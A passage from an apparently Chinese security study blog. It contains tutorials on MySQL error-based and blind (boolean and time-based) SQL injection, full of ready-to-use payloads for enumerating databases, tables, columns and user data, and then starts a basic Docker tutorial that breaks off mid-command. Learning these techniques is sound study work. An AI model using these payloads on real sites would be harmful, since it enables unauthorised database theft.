src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/02.png" alt="img"></p><p>但是报错长度有限制，可以使用<code>limit</code>来偏移</p><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(schema_name,1,32) from information_schema.schemata limit 4,1)),0x7e)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/03.png" alt="img"></p><ul><li>爆所有表</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/04.png" alt="img"></p><ul><li>爆所有列</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,32) from information_schema.columns where table_schema&#x3D;database()),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/05.png" alt="img"></p><ul><li>爆数据</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(username),1,32) from users),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/06.png" alt="img"></p><h3 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h3><p><code>extractvalue(xml_str , Xpath)</code><br>第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径</p><p>还是对第二个参数xpath传入特殊字符，让它报错，跟updatexml的payload差不多，只不过一个是3个参数，一个是两个，这里就不详细列出来了</p><pre><code class="hljs mysql">extractvalue(1,concat(0x7e,version(),1))</code></pre><h2 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h2><pre><code class="hljs mysql">mysql&gt; select count(*) from user group by concat(version(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &#39;5.1.60-community-log1&#39; for key &#39;group_key&#39;</code></pre><pre><code class="hljs mysql">mysql&gt; select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</code></pre><p>只要是<code>count</code>，<code>rand()</code>，<code>group by</code>三个连用就会造成这种报错，与位置无关。</p><h2 id="函数特性报错"><a href="#函数特性报错" class="headerlink" title="函数特性报错"></a>函数特性报错</h2><p><code>在版本号为5.5.47上可以用来注入，而在5.7.17上则不行</code></p><ul><li>geometrycollection()</li></ul><pre><code class="hljs mysql">and geometrycollection((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multipoint()</li></ul><pre><code class="hljs mysql">and multipoint((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>polygon()</li></ul><pre><code class="hljs mysql">and polygon((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multipolygon()</li></ul><pre><code class="hljs mysql">and multipolygon((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>linestring()</li></ul><pre><code class="hljs mysql">and linestring((select * from(select * from(select user())a)b))-- +</code></pre><ul><li>multilinestring()</li></ul><pre><code class="hljs mysql">and multilinestring((select * from(select * from(select user())a)b))-- +</code></pre><h2 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h2><h3 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h3><p>如果程序过滤information_schema，无法获取表名，利用polygon()进行绕过，括号里填上存在的列名(一般都有id这个列)，即可爆出表名</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/07.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>报错注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入学习之MYSQL盲注</title>
    <link href="/p/3f4fbe96.html"/>
    <url>/p/3f4fbe96.html</url>
    
    <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>如果每个应用程序都能按照我们输入的 SQL 命令返回我们需要的数据，那应用程序就无安全性可言了！为此，程序设计者们想到一个办法，那就是无论输入何种命令，只要 SQL 语句导致数据库产生错误，那么应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。这时，回显方式的 SQL 注入办法就无法使用了。盲注，即在 SQL 注入过程中，SQL 语句执行选择后，选择的数据不能回显到前端，需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><h2 id="盲注分为两类："><a href="#盲注分为两类：" class="headerlink" title="盲注分为两类："></a>盲注分为两类：</h2><p><strong>一、 基于布尔型 SQL 盲注；</strong></p><p>• 基于布尔型 SQL 盲注即在 SQL 注入过程中，应用程序仅仅返回 True（页面）和 False（页面）。</p><p>• 无法根据应用程序的返回页面得到需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到需要的信息。</p><p><strong>二、 基于时间型 SQL 盲注；注入 SQL 代码之后，存在以下两种情况：</strong></p><p>• 如果注入的 SQL 代码不影响后台[数据库]的正常功能执行，那么 Web 应用的页面显示正确（原始页面）。</p><p>• 如果注入的 SQL 代码影响后台数据库的正常功能（产生了 SQL 注入），但是此时Web 应用的页面依旧显示正常（原因是 Web 应用程序采取了“重定向”或“屏蔽”措施）。</p><p>产生一个疑问：注入的 SQL 代码到底被后台数据库执行了没有？即 Web 应用程序是否存在 SQL 注入？</p><p>面对这种情况，之前讲的基于布尔的 SQL 盲注就很难发挥作用了（因为基于布尔的 SQL 盲注的前提是 Web 程序返回的页面存在 true 和 false 两种不同的页面）。这时，一般采用基于 web 应用响应时间上的差异来判断是否存在 SQL 注入，即基于时间型 SQL 盲注。</p><h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p>在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据的目的</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>网上的payload一般是利用<code>ascii()</code>、<code>substr()</code>、<code>length()</code>结合进行利用</p><ul><li><h4 id="获取数据库长度"><a href="#获取数据库长度" class="headerlink" title="获取数据库长度"></a>获取数据库长度</h4><pre><code class="hljs mysql">and (select length(database()))&#x3D;长度</code></pre></li></ul><p>  <code>大于7</code>返回<code>正常</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/01.png" alt="大于7返回正常"></p><p>  <code>大于8</code>返回<code>错误</code></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/02.png" alt="大于8返回错误"></p><p>  <code>等于8</code>返回<code>正常</code>，说明数据库长度为8</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/03.png" alt="等于8返回正常"></p><ul><li><h4 id="逐字猜解数据库名"><a href="#逐字猜解数据库名" class="headerlink" title="逐字猜解数据库名"></a>逐字猜解数据库名</h4><pre><code class="hljs mysql">and (select ascii(substr(database(),位数,1)))&#x3D;ascii码</code></pre><p><strong>ASCII对照表</strong></p></li></ul><table><thead><tr><th align="center">ASCII值</th><th align="center">控制字符</th><th align="center">ASCII值</th><th align="center">控制字符</th><th align="center">ASCII值</th><th align="center">控制字符</th><th align="center">ASCII值</th><th align="center">控制字符</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">NUT</td><td align="center">32</td><td align="center">(space)</td><td align="center">64</td><td align="center">@</td><td align="center">96</td><td align="center">、</td></tr><tr><td align="center">1</td><td align="center">SOH</td><td align="center">33</td><td align="center">!</td><td align="center">65</td><td align="center">A</td><td align="center">97</td><td align="center">a</td></tr><tr><td align="center">2</td><td align="center">STX</td><td align="center">34</td><td align="center">“</td><td align="center">66</td><td align="center">B</td><td align="center">98</td><td align="center">b</td></tr><tr><td align="center">3</td><td align="center">ETX</td><td align="center">35</td><td align="center">#</td><td align="center">67</td><td align="center">C</td><td align="center">99</td><td align="center">c</td></tr><tr><td align="center">4</td><td align="center">EOT</td><td align="center">36</td><td align="center">$</td><td align="center">68</td><td align="center">D</td><td align="center">100</td><td align="center">d</td></tr><tr><td align="center">5</td><td align="center">ENQ</td><td align="center">37</td><td align="center">%</td><td align="center">69</td><td align="center">E</td><td align="center">101</td><td align="center">e</td></tr><tr><td align="center">6</td><td align="center">ACK</td><td align="center">38</td><td align="center">&amp;</td><td align="center">70</td><td align="center">F</td><td align="center">102</td><td align="center">f</td></tr><tr><td align="center">7</td><td align="center">BEL</td><td align="center">39</td><td align="center">,</td><td align="center">71</td><td align="center">G</td><td align="center">103</td><td align="center">g</td></tr><tr><td align="center">8</td><td align="center">BS</td><td align="center">40</td><td align="center">(</td><td align="center">72</td><td align="center">H</td><td align="center">104</td><td align="center">h</td></tr><tr><td align="center">9</td><td align="center">HT</td><td align="center">41</td><td align="center">)</td><td align="center">73</td><td align="center">I</td><td align="center">105</td><td align="center">i</td></tr><tr><td align="center">10</td><td align="center">LF</td><td align="center">42</td><td align="center">*</td><td align="center">74</td><td align="center">J</td><td align="center">106</td><td align="center">j</td></tr><tr><td align="center">11</td><td align="center">VT</td><td align="center">43</td><td align="center">+</td><td align="center">75</td><td align="center">K</td><td align="center">107</td><td align="center">k</td></tr><tr><td align="center">12</td><td align="center">FF</td><td align="center">44</td><td align="center">,</td><td align="center">76</td><td align="center">L</td><td align="center">108</td><td align="center">l</td></tr><tr><td align="center">13</td><td align="center">CR</td><td align="center">45</td><td align="center">-</td><td align="center">77</td><td align="center">M</td><td align="center">109</td><td align="center">m</td></tr><tr><td align="center">14</td><td align="center">SO</td><td align="center">46</td><td align="center">.</td><td align="center">78</td><td align="center">N</td><td align="center">110</td><td align="center">n</td></tr><tr><td align="center">15</td><td align="center">SI</td><td align="center">47</td><td align="center">/</td><td align="center">79</td><td align="center">O</td><td align="center">111</td><td align="center">o</td></tr><tr><td align="center">16</td><td align="center">DLE</td><td align="center">48</td><td align="center">0</td><td align="center">80</td><td align="center">P</td><td align="center">112</td><td align="center">p</td></tr><tr><td align="center">17</td><td align="center">DCI</td><td align="center">49</td><td align="center">1</td><td align="center">81</td><td align="center">Q</td><td align="center">113</td><td align="center">q</td></tr><tr><td align="center">18</td><td align="center">DC2</td><td align="center">50</td><td align="center">2</td><td align="center">82</td><td align="center">R</td><td align="center">114</td><td align="center">r</td></tr><tr><td align="center">19</td><td align="center">DC3</td><td align="center">51</td><td align="center">3</td><td align="center">83</td><td align="center">S</td><td align="center">115</td><td align="center">s</td></tr><tr><td align="center">20</td><td align="center">DC4</td><td align="center">52</td><td align="center">4</td><td align="center">84</td><td align="center">T</td><td align="center">116</td><td align="center">t</td></tr><tr><td align="center">21</td><td align="center">NAK</td><td align="center">53</td><td align="center">5</td><td align="center">85</td><td align="center">U</td><td align="center">117</td><td align="center">u</td></tr><tr><td align="center">22</td><td align="center">SYN</td><td align="center">54</td><td align="center">6</td><td align="center">86</td><td align="center">V</td><td align="center">118</td><td align="center">v</td></tr><tr><td align="center">23</td><td align="center">TB</td><td align="center">55</td><td align="center">7</td><td align="center">87</td><td align="center">W</td><td align="center">119</td><td align="center">w</td></tr><tr><td align="center">24</td><td align="center">CAN</td><td align="center">56</td><td align="center">8</td><td align="center">88</td><td align="center">X</td><td align="center">120</td><td align="center">x</td></tr><tr><td align="center">25</td><td align="center">EM</td><td align="center">57</td><td align="center">9</td><td align="center">89</td><td align="center">Y</td><td align="center">121</td><td align="center">y</td></tr><tr><td align="center">26</td><td align="center">SUB</td><td align="center">58</td><td align="center">:</td><td align="center">90</td><td align="center">Z</td><td align="center">122</td><td align="center">z</td></tr><tr><td align="center">27</td><td align="center">ESC</td><td align="center">59</td><td align="center">;</td><td align="center">91</td><td align="center">[</td><td align="center">123</td><td align="center">{</td></tr><tr><td align="center">28</td><td align="center">FS</td><td align="center">60</td><td align="center">&lt;</td><td align="center">92</td><td align="center">/</td><td align="center">124</td><td align="center">|</td></tr><tr><td align="center">29</td><td align="center">GS</td><td align="center">61</td><td align="center">=</td><td align="center">93</td><td align="center">]</td><td align="center">125</td><td align="center">}</td></tr><tr><td align="center">30</td><td align="center">RS</td><td align="center">62</td><td align="center">&gt;</td><td align="center">94</td><td align="center">^</td><td align="center">126</td><td align="center">`</td></tr><tr><td align="center">31</td><td align="center">US</td><td align="center">63</td><td align="center">?</td><td align="center">95</td><td align="center">_</td><td align="center">127</td><td align="center">DEL</td></tr></tbody></table><p>数据库第一位字符ASCII码为<code>114</code>返回<code>错误</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/04.png" alt="数据库第一位字符"></p><p>数据库第一位字符ASCII码为<code>115</code>返回<code>正确</code>，说明数据库第一位字符为<code>s</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/05.png" alt="数据库第一位字符"></p><p>数据库第二位字符ASCII码为<code>100</code>返回<code>错误</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/06.png" alt="数据库第二位字符"></p><p>数据库第二位字符ASCII码为<code>101</code>返回<code>正确</code>，说明数据库第二位字符为<code>e</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/07.png" alt="数据库第二位字符"></p><p>…..</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and (select ascii(substr(database(),8,1)))&#x3D;121 --+</code></pre><p>以此类推，最后得到数据库为<code>security</code></p><ul><li><h4 id="猜解表名数量"><a href="#猜解表名数量" class="headerlink" title="猜解表名数量"></a>猜解表名数量</h4></li></ul><pre><code class="hljs mysql">and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;数量</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/08.png" alt="有4个表"></p><ul><li><h4 id="猜解某个表长度"><a href="#猜解某个表长度" class="headerlink" title="猜解某个表长度"></a>猜解某个表长度</h4><p>使用<code>limit</code>偏移，<code>n</code>从<code>0</code>开始</p></li></ul><pre><code class="hljs mysql">and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度</code></pre><p>第4个表长度为5</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/09.png" alt="第4个表长度为5"></p><ul><li><h4 id="逐位猜解表名"><a href="#逐位猜解表名" class="headerlink" title="逐位猜解表名"></a>逐位猜解表名</h4></li></ul><pre><code class="hljs mysql">and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema &#x3D; database() limit n,1)&#x3D;ascii码</code></pre><p>第<code>4</code>个表第<code>一</code>位<code>ascii码</code>为<code>116</code>报错</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/10.png" alt="等于116报错"></p><p>第<code>4</code>个表第<code>一</code>位<code>ascii码</code>为<code>117</code>正确，说明第<code>4</code>个表第<code>一</code>位为<code>u</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/11.png" alt="等于117正确"></p><p>….</p><p>以此类推，最后得到第<code>4</code>个表<code>表名</code>为<code>users</code></p><ul><li><h4 id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h4></li></ul><pre><code class="hljs mysql">and (select count(*) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; 表名)&#x3D;数量</code></pre><p><code>users</code>表<code>列名</code>数量为<code>3</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190813_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E7%9B%B2%E6%B3%A8/12.png" alt="users表列名数量为3"></p><ul><li><h4 id="猜解某个列长度"><a href="#猜解某个列长度" class="headerlink" title="猜解某个列长度"></a>猜解某个列长度</h4><p>使用<code>limit</code>偏移，<code>n</code>从<code>0</code>开始</p></li></ul><pre><code class="hljs mysql">and (select length(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; limit n,1)&#x3D;长度</code></pre><ul><li><h4 id="逐位猜解列名"><a href="#逐位猜解列名" class="headerlink" title="逐位猜解列名"></a>逐位猜解列名</h4></li></ul><pre><code class="hljs mysql">and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码</code></pre><ul><li><h4 id="判断数据的数量"><a href="#判断数据的数量" class="headerlink" title="判断数据的数量"></a>判断数据的数量</h4></li></ul><pre><code class="hljs mysql">and (select count(列名) from 表名)&#x3D;数量</code></pre><ul><li><h4 id="猜解某条数据的长度"><a href="#猜解某条数据的长度" class="headerlink" title="猜解某条数据的长度"></a>猜解某条数据的长度</h4></li></ul><pre><code class="hljs mysql">and (select length(列名) from admin limit n,1)&#x3D;长度</code></pre><ul><li><h4 id="逐位猜解数据"><a href="#逐位猜解数据" class="headerlink" title="逐位猜解数据"></a>逐位猜解数据</h4></li></ul><pre><code class="hljs mysql">and (select ascii(substr(user,位数,1)) from admin limit n,1)&#x3D;ascii码</code></pre><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用</p><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><p>网上的payload一般是利用<code>sleep()</code>进行利用</p><ul><li><h4 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(database()))&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(database(),位数,1))&#x3D;ascii码),sleep(6),0)</code></pre><ul><li><h4 id="判断表名的数量"><a href="#判断表名的数量" class="headerlink" title="判断表名的数量"></a>判断表名的数量</h4></li></ul><pre><code class="hljs mysql">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;个数,sleep(6),0)</code></pre><ul><li><h4 id="判断某个表名的长度"><a href="#判断某个表名的长度" class="headerlink" title="判断某个表名的长度"></a>判断某个表名的长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="逐位猜表名"><a href="#逐位猜表名" class="headerlink" title="逐位猜表名"></a>逐位猜表名</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;ascii码,sleep(6),0)</code></pre><ul><li><h4 id="判断列名数量"><a href="#判断列名数量" class="headerlink" title="判断列名数量"></a>判断列名数量</h4></li></ul><pre><code class="hljs mysql">and if((select count(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot;)&#x3D;个数,sleep(6),0)</code></pre><ul><li><h4 id="判断某个列名的长度"><a href="#判断某个列名的长度" class="headerlink" title="判断某个列名的长度"></a>判断某个列名的长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="逐位猜列名"><a href="#逐位猜列名" class="headerlink" title="逐位猜列名"></a>逐位猜列名</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码,sleep(6),0)</code></pre><ul><li><h4 id="判断数据的数量-1"><a href="#判断数据的数量-1" class="headerlink" title="判断数据的数量"></a>判断数据的数量</h4></li></ul><pre><code class="hljs mysql">and if((select count(列名) from 表名)&#x3D;个数,sleep(6),0)</code></pre><ul><li><h4 id="判断某个数据的长度"><a href="#判断某个数据的长度" class="headerlink" title="判断某个数据的长度"></a>判断某个数据的长度</h4></li></ul><pre><code class="hljs mysql">and if((select length(列名) from 表名)&#x3D;长度,sleep(6),0)</code></pre><ul><li><h4 id="逐位猜数据"><a href="#逐位猜数据" class="headerlink" title="逐位猜数据"></a>逐位猜数据</h4></li></ul><pre><code class="hljs mysql">and if((select ascii(substr(列名,n,1)) from 表名)&#x3D;ascii码,sleep(6),0)</code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="/p/4a3d459a.html"/>
    <url>/p/4a3d459a.html</url>
    
    <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Docker是一个开源的应用容器引擎，是一个轻量级容器技术；基于Go语言并遵循Apache2.0协议开源。</p><p>Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口，更重要的是容器性能开销极低。</p><p>Docker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；</p><p>运行中的这个镜像称为容器，容器启动是非常快速的。类似Windows里面的ghost操作系统，安装好后就什么都有了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20190315_Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/01.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20190315_Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/02.png" alt="img"></p><h2 id="二、核心概念"><a href="#二、核心概念" class="headerlink" title="二、核心概念"></a>二、核心概念</h2><p><strong>docker主机(Host)</strong> ：安装了Docker程序的机器（Docker直接安装在操作系统之上）；</p><p><strong>docker客户端(Client)</strong> ：连接docker主机进行操作；</p><p><strong>docker仓库(Registry)</strong> ：用来保存各种打包好的软件镜像；</p><p><strong>docker镜像(Images)</strong> ：软件打包好的镜像；放在docker仓库中；</p><p><strong>docker容器(Container)</strong> ：镜像启动后的实例称为一个容器；容器是独立运行的一个或一组应用</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20190315_Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/03.png" alt="img"></p><p>使用Docker的步骤：</p><p>1）、安装Docker</p><p>2）、去Docker仓库找到这个软件对应的镜像；</p><p>3）、使用Docker运行这个镜像，这个镜像就会生成一个Docker容器</p><p>4）、对容器的启动停止就是对软件的启动停止；</p><h2 id="三、安装Docker"><a href="#三、安装Docker" class="headerlink" title="三、安装Docker"></a>三、安装Docker</h2><h3 id="1、安装linux虚拟机"><a href="#1、安装linux虚拟机" class="headerlink" title="1、安装linux虚拟机"></a>1、安装linux虚拟机</h3><p>1）、VMWare、VirtualBox（安装）；</p><p>2）、导入虚拟机文件；</p><p>3）、双击启动linux虚拟机;使用 root/ 123456登陆</p><p>4）、使用客户端连接linux服务器进行命令操作；</p><p>5）、设置虚拟机网络：桥接网络===选好网卡====接入网线；</p><p>6）、设置好网络以后使用命令重启虚拟机的网络</p><pre><code class="hljs Shell">service network restart</code></pre><p>7）、查看linux的ip地址</p><pre><code class="hljs Shell">ip addr</code></pre><h3 id="2、在linux虚拟机上安装Docker"><a href="#2、在linux虚拟机上安装Docker" class="headerlink" title="2、在linux虚拟机上安装Docker"></a>2、在linux虚拟机上安装Docker</h3><p>步骤：</p><p>1、检查内核版本，必须是<code>3.10</code>及以上uname -r</p><p>2、安装docker <code>yum install docker</code> 或者 <code>apt install docker.io</code></p><p>3、输入y确认安装</p><p>4、启动docker</p><pre><code class="hljs Shell">[root@localhost ~]# systemctl start docker[root@localhost ~]# docker -vDocker version 1.12.6, build 3e8e77d/1.12.6</code></pre><p>5、开机启动docker</p><pre><code class="hljs Shell">[root@localhost ~]# systemctl enable dockerCreated symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</code></pre><p>6、停止docker</p><pre><code class="hljs Shell"><span class="hljs-meta">$</span><span class="bash"> systemctl stop docker</span></code></pre><h2 id="四、Docker常用命令-amp-操作"><a href="#四、Docker常用命令-amp-操作" class="headerlink" title="四、Docker常用命令&amp;操作"></a>四、Docker常用命令&amp;操作</h2><h3 id="1、镜像操作"><a href="#1、镜像操作" class="headerlink" title="1、镜像操作"></a>1、镜像操作</h3><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>检索</td><td>docker search 关键字 eg：docker search redis</td><td>我们经常去docker hub上检索镜像的详细信息，如镜像的TAG。</td></tr><tr><td>拉取</td><td>docker pull 镜像名:tag</td><td>:tag是可选的，tag表示标签，多为软件的版本，默认是latest</td></tr><tr><td>列表</td><td>docker images</td><td>查看所有本地镜像</td></tr><tr><td>删除</td><td>docker rmi image-id</td><td>删除指定的本地镜像</td></tr></tbody></table><p>具体细节查阅：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p><h3 id="2、容器操作"><a href="#2、容器操作" class="headerlink" title="2、容器操作"></a>2、容器操作</h3><p>软件镜像（QQ安装程序）—-运行镜像—-产生一个容器（正在运行的软件，运行的QQ）；</p><p>步骤：</p><p>1、搜索镜像</p><pre><code class="hljs Shell">[root@localhost ~]# docker search tomcat</code></pre><p>2、拉取镜像</p><pre><code class="hljs Shell">[root@localhost ~]# docker pull tomcat</code></pre><p>3、根据镜像启动容器</p><pre><code class="hljs ShellShell">docker run --name mytomcat -d tomcat:latest</code></pre><p>4、查看运行中的容器</p><pre><code class="hljs Shell">docker ps</code></pre><p>5、 停止运行中的容器</p><pre><code class="hljs Shell">docker stop 